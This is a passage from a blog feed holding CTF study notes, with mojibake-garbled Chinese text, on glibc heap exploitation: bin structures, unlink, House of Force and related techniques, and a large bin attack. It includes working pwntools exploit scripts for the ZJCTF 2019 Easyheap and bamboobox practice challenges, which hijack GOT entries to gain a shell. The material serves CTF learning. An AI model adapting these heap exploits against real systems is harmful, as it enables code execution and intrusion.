‰∏™ fast binsÔºåÂ≠òÂÇ®Âú® fastbinsY ‰∏≠<br>1 ‰∏™ unsorted binÔºåÂ≠òÂÇ®Âú® bin[1]<br>62 ‰∏™ small binsÔºåÂ≠òÂÇ®Âú® bin[2] Ëá≥ bin[63]<br>63 ‰∏™ large binsÔºåÂ≠òÂÇ®Âú® bin[64] Ëá≥ bin[126]</p><h3 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h3><p>LIFOÂçïÈìæË°®(‰∏çÁî®bk)</p><p>chunk Â§ßÂ∞èÔºàÂê´ chunk Â§¥ÈÉ®ÔºâÔºö0x10-0x40Ôºà64 ‰Ωç 0x20-0x80Ôºâ</p><p>Áõ∏ÈÇª bin Â≠òÊîæÁöÑÂ§ßÂ∞èÁõ∏Â∑Æ 0x8Ôºà0x10ÔºâB„ÄÇ</p><p>‰∏çÂèñÊ∂àinuse flagÔºåÊïÖÁõ∏ÈÇª‰∏ç‰ºöÂêàÂπ∂</p><p>freeÁöÑÊó∂ÂÄôÊèíÂà∞ÂØπÂ∫îbinÈìæË°®ÁöÑÂâçÈù¢ÔºåÊ≥®ÊÑèËÆ∞ÂΩïÁöÑÂú∞ÂùÄ‰∏∫freeÁöÑÂú∞ÂùÄÂáè0x10</p><p>ÂêåÊ†∑ÁöÑÔºåmallocÂÆûÈôÖÂàÜÈÖçÁöÑÂÜÖÂ≠òÂ§ßÂ∞èÂ∫îÂä†‰∏ä0x10</p><p>ÂΩìÂàÜÈÖç‰∏ÄÂùóËæÉÂ∞èÁöÑÂÜÖÂ≠ò(mem&lt;&#x3D;64 Bytes)Êó∂Ôºå‰ºöÈ¶ñÂÖàÊ£ÄÊü•ÂØπÂ∫îÂ§ßÂ∞èÁöÑfastbin‰∏≠ÊòØÂê¶ÂåÖÂê´Êú™Ë¢´‰ΩøÁî®ÁöÑchunkÔºåÂ¶ÇÊûúÂ≠òÂú®ÂàôÁõ¥Êé•Â∞ÜÂÖ∂‰ªéfastbin‰∏≠ÁßªÈô§Âπ∂ËøîÂõûÔºõÂê¶ÂàôÈÄöËøáÂÖ∂‰ªñÊñπÂºèÔºàÂâ™Âàátop chunkÔºâÂæóÂà∞‰∏ÄÂùóÁ¨¶ÂêàÂ§ßÂ∞èË¶ÅÊ±ÇÁöÑchunkÂπ∂ËøîÂõû„ÄÇ</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>FIFOÂèåÂêëÂæ™ÁéØÈìæË°®</p><p>Â§ß‰∫éfast binÊó∂ÔºåÊöÇÂ≠òÂú®unsorted bin</p><h3 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h3><p>FIFOÂèåÂêëÂæ™ÁéØÈìæË°®</p><p>0x10-0x1f8(0x20-0x3f0)</p><p>Áõ∏ÈÇªÁöÑÁ©∫Èó≤ chunk ‰ºöË¢´ÂêàÂπ∂</p><p>Áõ∏ÈÇª bin Â≠òÊîæÁöÑÂ§ßÂ∞èÁõ∏Â∑Æ 0x8Ôºà0x10ÔºâB</p><h3 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h3><p>Â§ß‰∫éÁ≠â‰∫é 0x200Ôºà0x400ÔºâBÔºàÂÆûÈôÖÂ§ßÂ∞èÔºâ</p><p>ÂèåÂêëÂæ™ÁéØÈìæË°®ÔºåÊèíÂÖ•ÂíåÂà†Èô§ÂèØ‰ª•ÂèëÁîüÂú®‰ªªÊÑè‰ΩçÁΩÆÔºåÁõ∏ÈÇªÁ©∫Èó≤ chunk ‰πü‰ºöË¢´ÂêàÂπ∂</p><p>fd_nextsize,bk_nextsize</p><p>Ââç32: 0x400 + 0x40*i</p><p>32~48: 0x1380 + 512*j</p><p>‚Ä¶</p><p>bin‰∏≠Â§ßÂ∞è‰∏çÂêåÔºåËøõË°åsort,Â§ßÂú®Ââç</p><h3 id="tcache-bins"><a href="#tcache-bins" class="headerlink" title="tcache bins"></a>tcache bins</h3><p>LIFO,max7,no prev_inuse</p><p>0x20-0x410(64in total,16byte)</p><p><code>tcache_perthread_struct</code>Êú¨Ë∫´‰πüÊòØ‰∏Ä‰∏™Â†ÜÂùóÔºåÂ§ßÂ∞è‰∏∫<code>0x250</code>Ôºå‰Ωç‰∫éÂ†ÜÂºÄÂ§¥ÁöÑ‰ΩçÁΩÆÔºåÂåÖÂê´Êï∞ÁªÑ<code>counts</code>Â≠òÊîæÊØè‰∏™<code>bin</code>‰∏≠ÁöÑ<code>chunk</code>ÂΩìÂâçÊï∞ÈáèÔºå‰ª•ÂèäÊï∞ÁªÑ<code>entries</code>Â≠òÊîæ<code>64</code>‰∏™<code>bin</code>ÁöÑÈ¶ñÂú∞ÂùÄÔºàÂèØ‰ª•ÈÄöËøá<strong>Âä´ÊåÅÊ≠§Â†ÜÂùó</strong>ËøõË°åÊîªÂáªÔºâ„ÄÇ</p><h3 id="last-remainder-chunk"><a href="#last-remainder-chunk" class="headerlink" title="last remainder chunk"></a>last remainder chunk</h3><p>mallocÊó∂ÔºåËæÉÂ§ßÁöÑchunk‰ºösplit‰∏ÄÈÉ®ÂàÜÂà∞last remainderÔºåunsorted bin‰πü‰ºöÂ≠ò</p><p>‰∏ãÊ¨°mallocÔºåÂ§üÂ§ß‰ºöÁõ¥Êé•ÂàáÂá∫Êù•</p><h2 id="main-arena-header"><a href="#main-arena-header" class="headerlink" title="main arena header"></a>main arena header</h2><p>Â≠òbin,top chunkÁ≠â</p><p>libc bss‰∏≠</p><h2 id="marge-freed-chunk"><a href="#marge-freed-chunk" class="headerlink" title="marge freed chunk"></a>marge freed chunk</h2><h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><ul><li><p>detect next inuse bit: freed?(to avoid double freed)</p></li><li><p>last freed? &#x3D;&gt; unlink &#x3D;&gt; merge &#x3D;&gt; merge into unsorted bin</p></li><li><p>next top?</p><ul><li>next freed?<ul><li>inuse: merge into unsorted bin</li></ul></li></ul></li></ul><h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><p>dangling pointer</p><h1 id="Heap-Overflow"><a href="#Heap-Overflow" class="headerlink" title="Heap Overflow"></a>Heap Overflow</h1><h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><h3 id="modern-protection"><a href="#modern-protection" class="headerlink" title="modern protection"></a>modern protection</h3><h4 id="corrupted-double-link-list"><a href="#corrupted-double-link-list" class="headerlink" title="corrupted double link list"></a>corrupted double link list</h4><p>when unlink</p><p>check if:</p><ul><li>P-&gt;bk-&gt;fd &#x3D;&#x3D; P</li><li>P-&gt;fd-&gt;bk &#x3D;&#x3D; P</li></ul><p>to satisfy:(i386)</p><ul><li><code>fakeFD -&gt; bk == P</code> &lt;&#x3D;&gt; <code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code> &lt;&#x3D;&gt; <code>*(fakeBK + 8) == P</code></li></ul><p>then:</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code> &lt;&#x3D;&gt; <code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code> &lt;&#x3D;&gt; <code>*(fakeBK + 8) = fakeFD</code></li></ul><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230609205918850.png" alt="image-20230609205918850"></p><p>ËÆæÊåáÂêëÂèØ UAF chunk ÁöÑÊåáÈíàÁöÑÂú∞ÂùÄ‰∏∫ ptr</p><ol><li>‰øÆÊîπ fd ‰∏∫ ptr - 0x18</li><li>‰øÆÊîπ bk ‰∏∫ ptr - 0x10</li><li>Ëß¶Âèë unlink</li></ol><p>ÈúÄË¶Å‰ΩøfakechunkÁöÑÊåáÈíàÈ´ò‰∫éÂéüÊåáÈíà0x10‰∏™Â≠óËäÇÔºåÊâçËÉΩÈÄöËøáÊ£ÄÊµã</p><p>ptr-&gt;ptr-0x18</p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230610225454294.png" alt="image-20230610225454294"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230610231438688.png" alt="image-20230610231438688"></p><h3 id="ZJCTF-2019-Easyheap"><a href="#ZJCTF-2019-Easyheap" class="headerlink" title="ZJCTF 2019 Easyheap"></a>ZJCTF 2019 Easyheap</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">26809</span></span><br><span class="line"><span class="comment">#p = process(&quot;./easyheap&quot;)</span></span><br><span class="line">p = remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat</span>(<span class="params">size, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">creat(<span class="number">0x80</span>, <span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">creat(<span class="number">0x80</span>, <span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">creat(<span class="number">0x20</span>, <span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">addr = <span class="number">0x6020e0</span></span><br><span class="line">free_got = <span class="number">0x0000000000602018</span></span><br><span class="line">sys_plt = <span class="number">0x000000000400700</span></span><br><span class="line">payload = flat([<span class="number">0</span>, <span class="number">0x81</span>, addr-<span class="number">0x18</span>, addr-<span class="number">0x10</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">payload += flat([<span class="number">0x80</span>, <span class="number">0x90</span>])</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x90</span>, payload)</span><br><span class="line">delet(<span class="number">1</span>)</span><br><span class="line">payload = flat([free_got]).rjust(<span class="number">0x20</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x20</span>, payload)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x8</span>, p64(sys_plt))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#Âä´ÊåÅatoiÔºåÂú®menu‰∏≠ËæìÂÖ•/bin/shÊïàÊûú‰∏ÄÊ†∑</span></span><br></pre></td></tr></table></figure><h4 id="fake-chunk"><a href="#fake-chunk" class="headerlink" title="fake chunk"></a>fake chunk</h4><h1 id="Using-malloc-maleficarum"><a href="#Using-malloc-maleficarum" class="headerlink" title="Using malloc maleficarum"></a>Using malloc maleficarum</h1><h3 id="The-House-of-Spirit"><a href="#The-House-of-Spirit" class="headerlink" title="The House of Spirit"></a>The House of Spirit</h3><p>Ë¶ÜÁõñ‰∏çÂà∞ret,ÂèØ‰ª•ÁõñÂà∞Ê†à‰∏äfreeÁöÑÊåáÈíà‰ΩçÁΩÆ</p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230608162704523.png" alt="image-20230608162704523"></p><p>overflowÂêérop</p><h3 id="The-House-of-Force"><a href="#The-House-of-Force" class="headerlink" title="The House of Force"></a>The House of Force</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(pt, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">pt = process(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line"><span class="comment">#pt = remote(host, port)</span></span><br><span class="line"></span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;32&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;80&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">b&quot;\x00&quot;</span>*<span class="number">0x28</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line"></span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">debug()</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;-96&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;16&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,p64(<span class="number">0x0000000000400d49</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pt.interactive()</span><br></pre></td></tr></table></figure><h3 id="The-House-of-Orange"><a href="#The-House-of-Orange" class="headerlink" title="The House of Orange"></a>The House of Orange</h3><p>size&lt;&#x3D;128k(mmap)</p><p>È°µÂØπÈΩê4kb(0x1000)</p><h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h3><p>ÈíàÂØπÊ£ÄÊµãkey</p><ul><li>tcacheÂ°´Êª°</li><li>AËøõÂÖ•unsorted binÔºåbÈöèÂêéÔºåÂ§ßÂ∞è‰∏∫tcache,ÂêàÂπ∂</li><li>ÈáäÊîæ‰∏Ä‰∏™tcache</li><li>free B</li></ul><h3 id="Overwrite-Fastbin"><a href="#Overwrite-Fastbin" class="headerlink" title="Overwrite Fastbin"></a>Overwrite Fastbin</h3><table><thead><tr><th>ÊîªÂáªÊñπÊ≥ï</th><th>ÂΩ±ÂìçËåÉÂõ¥</th><th>Â≠¶‰π†ÈìæÊé•</th></tr></thead><tbody><tr><td>house of spirit</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>Â†ÜÂà©Áî®Á≥ªÂàó‰πã house of spirit - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of einherjar</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>PWN‚Äî‚ÄîHouse Of Einherjar CTF Wiki ‰æãÈ¢òËØ¶Ëß£ - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of force</td><td>2.23‚Äî‚Äî2.29</td><td>Top chunk Âä´ÊåÅÔºöHouse of force ÊîªÂáª - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of lore</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>House of Lore - CTF Wiki (ctf-wiki.org)</td></tr><tr><td>house of orange</td><td>2.23‚Äî‚Äî2.26</td><td>House of orange - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of rabbit</td><td>2.23‚Äî‚Äî2.28</td><td><a href="http://p4nda.top/2018/04/18/house-of-rabbit/">http://p4nda.top/2018/04/18/house-of-rabbit/</a></td></tr><tr><td>house of roman</td><td>2.23‚Äî‚Äî2.29</td><td>House of Roman - CTF Wiki (ctf-wiki.org)</td></tr><tr><td>house of storm</td><td>2.23‚Äî‚Äî2.29</td><td>House of storm ÂéüÁêÜÂèäÂà©Áî® - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of corrosion</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>House-of-Corrosion ‰∏ÄÁßçÊñ∞ÁöÑÂ†ÜÂà©Áî®ÊäÄÂ∑ß - ÂÖàÁü•Á§æÂå∫ (aliyun.com)</td></tr><tr><td>house of husk</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>house-of-husk Â≠¶‰π†Á¨îËÆ∞ - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of atum</td><td>2.26‚Äî‚Äî2.30</td><td><a href="https://abf1ag.github.io/2021/06/11/house-of-atum/">https://abf1ag.github.io/2021/06/11/house-of-atum/</a></td></tr><tr><td>house of kauri</td><td>2.26‚Äî‚Äî2.32</td><td>Overview of GLIBC heap exploitation techniques (0x434b.dev)</td></tr><tr><td>house of fun</td><td>2.23‚Äî‚Äî2.30</td><td>Overview of GLIBC heap exploitation techniques (0x434b.dev)</td></tr><tr><td>house of mind</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>how2heap&#x2F;house_of_mind_fastbin.c at master ¬∑ shellphish&#x2F;how2heap (github.com)</td></tr><tr><td>house of muney</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>House of Muney ÂàÜÊûê - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of botcake</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>Â•áÂÆâ‰ø°ÊîªÈò≤Á§æÂå∫ - Ê∑±ÂÖ•ÁêÜËß£ House of Botcake Â†ÜÂà©Áî®ÊâãÊ≥ï (butian.net)</td></tr><tr><td>house of rust</td><td>2.26‚Äî‚Äî Ëá≥‰ªä</td><td>c4ebt&#x2F;House-of-Rust</td></tr><tr><td>house of crust</td><td>2.26‚Äî‚Äî2.37</td><td>c4ebt&#x2F;House-of-Rust</td></tr><tr><td>house of io</td><td>2.26‚Äî‚Äî Ëá≥‰ªä</td><td>Overview of GLIBC heap exploitation techniques (0x434b.dev)</td></tr><tr><td>house of banana</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>house of banana - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of kiwi</td><td>2.23‚Äî‚Äî2.36</td><td>House OF Kiwi - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of emma</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>house of emma</td></tr><tr><td>house of pig</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>house of pig ‰∏Ä‰∏™Êñ∞ÁöÑÂ†ÜÂà©Áî®ËØ¶Ëß£ - ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</td></tr><tr><td>house of obstack</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>‰∏ÄÊù°Êñ∞ÁöÑ glibc IO_FILE Âà©Áî®ÈìæÔºö_IO_obstack_jumps Âà©Áî®ÂàÜÊûê - Ë∑≥Ë∑≥Á≥ñ (tttang.com)</td></tr><tr><td>house of apple1</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>House of Apple ‰∏ÄÁßçÊñ∞ÁöÑ glibc ‰∏≠ IO ÊîªÂáªÊñπÊ≥ï (1) - roderick - record and learn! (roderickchan.cn)</td></tr><tr><td>house of apple2</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>House of Apple ‰∏ÄÁßçÊñ∞ÁöÑ glibc ‰∏≠ IO ÊîªÂáªÊñπÊ≥ï (2) - roderick - record and learn! (roderickchan.cn)</td></tr><tr><td>house of apple3</td><td>2.23‚Äî‚Äî Ëá≥‰ªä</td><td>House of Apple ‰∏ÄÁßçÊñ∞ÁöÑ glibc ‰∏≠ IO ÊîªÂáªÊñπÊ≥ï (3) - roderick - record and learn! (roderickchan.cn)</td></tr></tbody></table><h1 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h1><h1 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h1><h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><p>0x200000</p><h2 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Êàë‰ª¨‰øÆÊîπ‰∫Ü<code>p1</code>ÁöÑ<code>bk_nextsize</code>‰∏∫<code>[target-0x20]</code>,‰πüÂ∞±ÂØºËá¥‰∫Ü<code>victim-&gt;bk_nextsize = (&amp;target)-4)</code></p><p>ÁÑ∂ÂêéÊâßË°å<code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code>‰πüÂ∞±ÊòØ<code>(&amp;target)-4)-&gt;fd_nextsize = victim</code> ,Áõ∏ÂΩì‰∫é<code>*target = victim</code> Â∞±Âú®<code>target</code>Â§ÑÂÜô‰∏ä‰∫ÜÊñ∞ÂÖ•<code>large bin</code>ÁöÑ<code>p2</code>ÁöÑÂú∞ÂùÄ</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;ÂÜôÁöÑ‰∏çÂ•ΩÔºåÊúâÁ©∫ÂÜçÊîπ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;Ê¶ÇËø∞&quot;&gt;&lt;a href=&quot;#Ê¶ÇËø∞&quot; class=&quot;headerlink&quot; title=&quot;Ê¶ÇËø∞&quot;&gt;&lt;/a&gt;Ê¶ÇËø∞&lt;/h1&gt;&lt;h2 id=&quot;ÂàÜÁ±ª&quot;&gt;&lt;a href=&quot;#ÂàÜÁ±ª&quot; cla</summary>
      
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ÁîµË∑ØÁ®≥ÊÄÅÂàÜÊûê</title>
    <link href="http://deepunk.icu/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90/"/>
    <id>http://deepunk.icu/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90/</id>
    <published>2023-05-20T13:07:01.000Z</published>
    <updated>2023-12-09T07:11:23.576Z</updated>
    
